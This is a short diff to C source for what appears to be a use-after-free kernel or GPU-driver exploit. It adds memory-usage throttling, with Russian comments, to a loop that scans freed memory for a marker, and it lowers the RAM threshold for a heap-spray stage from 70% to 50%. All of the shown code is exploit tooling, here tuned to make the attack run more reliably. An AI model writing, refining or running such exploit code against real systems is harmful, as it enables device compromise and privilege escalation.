@@ -1768,9 +1768,18 @@ static int scan_uaf_for_nonzero_multi(int fd, void *unused, int *num_found)
     uint64_t current_va = UAF_START;
     uint64_t end_va = UAF_START + UAF_SCAN_SIZE;
     int total_pages_scanned = 0;
+    double initial_ram = get_ram_usage_percentage();
 
     while (current_va < end_va && total_pages_scanned < SCAN_MAX_PAGES && !marker_found)
     {
+        double current_ram = get_ram_usage_percentage();
+        // Лимит 70% общего ОЗУ ИЛИ не более +20% к тому, что было до сканирования
+        if (current_ram > 70.0 || (current_ram - initial_ram) > 20.0) {
+            fprintf(stderr, "\n[!] SCAN THROTTLING: RAM at %.1f%%. Cooling down...\n", current_ram);
+            usleep(500000); // Пауза 0.5 сек для разгрузки
+            continue; 
+        }
+
         uint32_t *cmd = (uint32_t *)ib_vma;
         memset(ib_vma, 0, ib_alloc.mmapsize);
         int dw = 0;
@@ -2521,7 +2530,7 @@ restart:;
         double ram_usage = get_ram_usage_percentage();
         fprintf(stderr, "\r    [*] Sprayed: %d | RAM Usage: %.1f%% ... ", total_sprayed, ram_usage);
         
-        int reached_mem_limit = (ram_usage > 70.0);
+        int reached_mem_limit = (ram_usage > 50.0);
         
         if (!reached_mem_limit) {
             // Спреим пачку
